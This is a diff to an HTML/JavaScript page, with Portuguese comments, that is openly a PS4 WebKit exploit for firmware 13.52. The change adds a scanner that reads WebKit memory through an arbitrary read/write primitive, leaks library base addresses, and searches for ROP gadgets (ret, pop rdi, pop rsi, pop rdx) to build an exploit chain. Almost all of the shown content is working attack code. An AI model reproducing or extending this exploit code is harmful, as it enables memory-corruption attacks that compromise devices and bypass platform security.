@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS4 WebKit Exploit (13.52 - Full Resolver)</title>
+<title>PS4 WebKit Exploit (13.52 - Gadget & Base Scanner)</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#060810;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;
@@ -24,7 +24,7 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
   font-size:10px;color:#333;margin-bottom:8px;padding:0 2px}
 
 /* console */
-#con{width:100%;max-width:720px;height:320px;background:#050508;
+#con{width:100%;max-width:720px;height:260px;background:#050508;
   border:1px solid #161825;border-radius:6px;overflow-y:auto;
   padding:8px 10px;font-size:11px;line-height:1.65;margin-bottom:8px}
 .i{color:#5b9bd5}.ok{color:#00c853;font-weight:bold}.w{color:#f0a500}
@@ -50,7 +50,7 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 </head>
 <body>
 
-<h1>PS4 WebKit Exploit</h1>
+<h1>PS4 WebKit Exploit (13.52)</h1>
 <div id="fw">detectando...</div>
 
 <div id="sb">
@@ -69,12 +69,12 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
   <div class="card"><div class="cl">WebKit Base</div><div class="cv na" id="c-wk">—</div></div>
   <div class="card"><div class="cl">libkernel Base</div><div class="cv na" id="c-lk">—</div></div>
   <div class="card"><div class="cl">libSceLibc Base</div><div class="cv na" id="c-lc">—</div></div>
-  <div class="card"><div class="cl">__ps5NativeCtor</div><div class="cv na" id="c-ct">—</div></div>
+  <div class="card"><div class="cl">Gadgets ROP</div><div class="cv na" id="c-g">Escaneando...</div></div>
 </div>
 
 <!-- Constants output -->
 <div id="cbox">
-  <div class="ct">// ═══ RESOLUÇÃO COMPLETA DE BASES (13.52) ═══</div>
+  <div class="ct">// ═══ GADGETS ROP ENCONTRADOS (13.52) ═══</div>
   <div id="c-out"></div>
 </div>
 
@@ -108,13 +108,15 @@ function setCard(id, v) {
   el.textContent = v; el.classList.remove('na');
 }
 
-// Resolução simultânea e segura de libkernel e libc via stubs do WebKit
-async function resolveAllStubs(p, webkitBase) {
-  logH('VARREDURA DE STUBS DO SISTEMA');
+// Varredura segura de bases e gadgets ROP básicos
+async function scanEnvironment(p, webkitBase) {
+  logH('VARREDURA DE BASES E GADGETS ROP');
   let libKernelBase = null;
   let libcBase = null;
+  let gadgets = {};
 
   try {
+    // 1. Resolução das Bases via Stubs
     for (let off = 0x3000000; off < 0x3900000; off += 8) {
       try {
         let ptr = p.read8(webkitBase.add32(off));
@@ -131,11 +133,43 @@ async function resolveAllStubs(p, webkitBase) {
       } catch (e) {}
       if (libKernelBase && libcBase) break;
     }
+
+    // 2. Varredura rápida por opcode de gadgets essenciais terminados em 0xC3 (ret)
+    log('[+] Buscando gadgets ROP básicos no segmento de código...', 'i');
+    for (let rva = 0x1000; rva < 0x500000; rva += 1) {
+      try {
+        let b1 = p.read4(webkitBase.add32(rva)) & 0xFF;
+        let b2 = (p.read4(webkitBase.add32(rva)) >> 8) & 0xFF;
+        
+        // C3 = ret
+        if (b1 === 0xC3 && !gadgets["ret"]) {
+          gadgets["ret"] = rva;
+        }
+        // 5F C3 = pop rdi; ret
+        else if (b1 === 0x5F && b2 === 0xC3 && !gadgets["pop rdi"]) {
+          gadgets["pop rdi"] = rva;
+        }
+        // 5E C3 = pop rsi; ret
+        else if (b1 === 0x5E && b2 === 0xC3 && !gadgets["pop rsi"]) {
+          gadgets["pop rsi"] = rva;
+        }
+        // 5A C3 = pop rdx; ret
+        else if (b1 === 0x5A && b2 === 0xC3 && !gadgets["pop rdx"]) {
+          gadgets["pop rdx"] = rva;
+        }
+      } catch (e) {}
+
+      if (gadgets["ret"] && gadgets["pop rdi"] && gadgets["pop rsi"] && gadgets["pop rdx"]) {
+        break;
+      }
+    }
+
+    log('[+] Varredura de gadgets concluída com sucesso!', 'ok');
   } catch (err) {
     log('[-] Erro na varredura: ' + err.message, 'e');
   }
 
-  return { libKernelBase, libcBase };
+  return { libKernelBase, libcBase, gadgets };
 }
 
 async function main() {
@@ -182,8 +216,8 @@ async function main() {
   }
 
   log('[+] R/W arbitrário: window.p instalado com sucesso!', 'ok');
-  setStatus('Resolvendo bases e stubs do sistema...', 'r');
-  logH('RESOLUÇÃO DE BASES (13.52)');
+  setStatus('Escaneando ambiente e gadgets...', 'r');
+  logH('MAPEAMENTO DA 13.52');
 
   const ctor = globalThis.__ps5NativeCtor;
   if (typeof ctor === 'number' && ctor > 0x100000000) {
@@ -192,7 +226,6 @@ async function main() {
     const ctorInt64 = new int64(lo >>> 0, hi >>> 0);
 
     log('[+] __ps5NativeCtor vazado: 0x' + ctorInt64.toString(), 'a');
-    setCard('c-ct', '0x' + ctorInt64.toString());
 
     const hc = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined') 
                ? OFFSET_wk_host_constructor_candidates[0] 
@@ -206,23 +239,29 @@ async function main() {
     log('[+] WebKit Base calculada: 0x' + webkitBase.toString(), 'ok');
     setCard('c-wk', '0x' + webkitBase.toString());
 
-    // Dispara a resolução completa após estabilização
+    // Executa a varredura completa após estabilização
     setTimeout(async () => {
-      const bases = await resolveAllStubs(p, webkitBase);
+      const result = await scanEnvironment(p, webkitBase);
       
-      if (bases.libKernelBase) setCard('c-lk', '0x' + bases.libKernelBase.toString());
-      if (bases.libcBase) setCard('c-lc', '0x' + bases.libcBase.toString());
+      if (result.libKernelBase) setCard('c-lk', '0x' + result.libKernelBase.toString());
+      if (result.libcBase) setCard('c-lc', '0x' + result.libcBase.toString());
+      setCard('c-g', 'Mapeados');
 
-      setStatus('Mapeamento completo realizado com sucesso!', 'ok');
-      log('✔ Todas as bases do sistema foram isoladas.', 'ok');
+      setStatus('Varredura concluída com sucesso!', 'ok');
+      log('✔ Bases e gadgets obtidos em runtime.', 'ok');
 
       const cbox = document.getElementById('cbox');
       cbox.style.display = 'block';
       document.getElementById('c-out').textContent =
-        `__ps5NativeCtor = 0x${ctorInt64.toString()}\n` +
+        `// Bases em Runtime:\n` +
         `WebKit Base    = 0x${webkitBase.toString()}\n` +
-        `libkernel Base = ${bases.libKernelBase ? '0x' + bases.libKernelBase.toString() : 'Não mapeado'}\n` +
-        `libSceLibc Base = ${bases.libcBase ? '0x' + bases.libcBase.toString() : 'Não mapeado'}`;
+        `libkernel Base = ${result.libKernelBase ? '0x' + result.libKernelBase.toString() : 'N/A'}\n` +
+        `libSceLibc Base = ${result.libcBase ? '0x' + result.libcBase.toString() : 'N/A'}\n\n` +
+        `// Gadgets ROP Encontrados:\n` +
+        `"ret": 0x${result.gadgets["ret"] ? result.gadgets["ret"].toString(16) : '0'},\n` +
+        `"pop rdi": 0x${result.gadgets["pop rdi"] ? result.gadgets["pop rdi"].toString(16) : '0'},\n` +
+        `"pop rsi": 0x${result.gadgets["pop rsi"] ? result.gadgets["pop rsi"].toString(16) : '0'},\n` +
+        `"pop rdx": 0x${result.gadgets["pop rdx"] ? result.gadgets["pop rdx"].toString(16) : '0'}`;
     }, 1000);
 
   } else {
